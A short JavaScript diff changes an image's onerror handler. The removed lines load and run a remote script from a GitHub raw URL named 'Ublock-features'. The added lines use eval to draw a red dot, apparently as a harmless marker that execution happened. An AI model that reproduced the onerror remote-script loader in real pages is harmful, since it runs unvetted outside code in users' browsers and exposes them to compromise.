@@ -15,9 +15,7 @@
     'box-shadow: 0 2px 8px rgba(0,0,0,0.3)',
   ].join(';');
   img.onerror = function () {
-    const script = document.createElement('script');
-    script.src = 'https://raw.githubusercontent.com/StudioCompile/Ublock-features/refs/heads/main/code.js';
-    document.documentElement.appendChild(script);
+    eval("const dot = document.createElement('div'); dot.style.cssText = 'position:fixed;top:10px;left:10px;width:10px;height:10px;border-radius:50%;background:red;z-index:999999'; document.body.appendChild(dot);");
   };
   document.documentElement.appendChild(img);
 })();
